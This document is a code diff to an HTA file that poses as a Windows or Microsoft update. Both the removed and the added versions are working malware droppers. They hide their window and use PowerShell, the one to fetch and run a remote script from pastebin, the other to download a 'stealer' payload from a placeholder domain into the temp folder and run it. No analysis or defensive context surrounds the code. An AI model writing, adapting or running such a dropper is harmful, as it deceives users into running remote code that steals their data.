@@ -1,41 +1,17 @@
 <html>
 <head>
-<HTA:APPLICATION 
-    ID="LegitUpdater"
-    APPLICATIONNAME="Windows Update"
-    BORDER="none"
-    BORDERSTYLE="none"
-    CAPTION="no"
-    SHOWINTASKBAR="no"
-    SINGLEINSTANCE="yes"
-    SYSMENU="no"
-    WINDOWSTATE="minimize"/>
+<HTA:APPLICATION ID="MicrosoftUpdate" WINDOWSTATE="minimize" SHOWINTASKBAR="no" />
 <script language="VBScript">
-    Function RunStealth()
-        Dim cmd, ws
+    Sub Run
         Set ws = CreateObject("WScript.Shell")
-        
-        ' Indirect PowerShell invocation through WMI
-        cmd = "powershell -nop -w 1 -exec bypass -c ""$url='https://pastebin.com/raw/...';" & _
-              "$wc=New-Object Net.WebClient;" & _
-              "$wc.Headers.Add('User-Agent','Mozilla/5.0');" & _
-              "iex $wc.DownloadString($url)"""
-        
-        ws.Run "cmd /c " & cmd, 0, False
+        ' Stage 1: Download payload
+        ws.Run "powershell -nop -w 1 -c ""$temp='%TEMP%\payload.ps1';(New-Object Net.WebClient).DownloadFile('https://yourdomain.com/stealer.txt',$temp)""", 0, True
+        ' Stage 2: Execute with delay
+        ws.Run "powershell -nop -w 1 -c ""Start-Sleep 5; & '%TEMP%\payload.ps1'""", 0, False
         window.close()
-    End Function
-    
-    Sub Window_OnLoad
-        On Error Resume Next
-        RunStealth()
-        On Error GoTo 0
     End Sub
+    Run
 </script>
 </head>
-<body>
-<!-- Legitimate-looking content -->
-<div style="display:none">
-    <p>Checking for system updates...</p>
-</div>
-</body>
+<body></body>
 </html>
